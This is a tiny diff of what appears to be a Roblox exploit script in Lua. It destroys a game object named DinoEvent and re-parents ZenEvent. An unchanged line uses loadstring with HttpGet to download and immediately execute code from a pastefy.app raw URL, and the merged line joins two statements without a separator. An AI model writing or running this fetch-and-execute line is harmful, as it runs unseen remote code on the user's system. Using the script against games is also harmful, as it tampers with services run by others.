@@ -1,3 +1,2 @@
-workspace.DinoEvent:Destroy()
-game:GetService("ReplicatedStorage").Modules.UpdateService.ZenEvent.Parent = workspace
+workspace.DinoEvent:Destroy()game:GetService("ReplicatedStorage").Modules.UpdateService.ZenEvent.Parent = workspace
 loadstring(game:HttpGet("https://pastefy.app/J86mPNOz/raw"))()
